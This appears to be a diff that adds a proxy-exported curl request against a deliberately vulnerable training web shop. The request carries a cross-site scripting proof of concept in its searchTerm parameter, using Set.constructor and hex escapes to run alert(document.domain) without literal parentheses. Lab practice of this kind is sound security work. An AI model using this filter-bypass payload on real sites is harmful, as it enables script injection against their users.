@@ -1,0 +1,4 @@
+curl -i -s -k -X $'GET' \
+    -H $'Host: 54-215-243-64-shred.vulnerablesites.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://54-215-243-64-shred.vulnerablesites.net/Shred/catalog?category=PAINT' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Te: trailers' -H $'Connection: close' \
+    -b $'JSESSIONID=BD70FE30FB4B53131941A4FBE279A308; cart=\"\"' \
+    $'https://54-215-243-64-shred.vulnerablesites.net/Shred/search.action?searchTerm=Set.constructor%60alert%5Cx28document.domain%5Cx29'
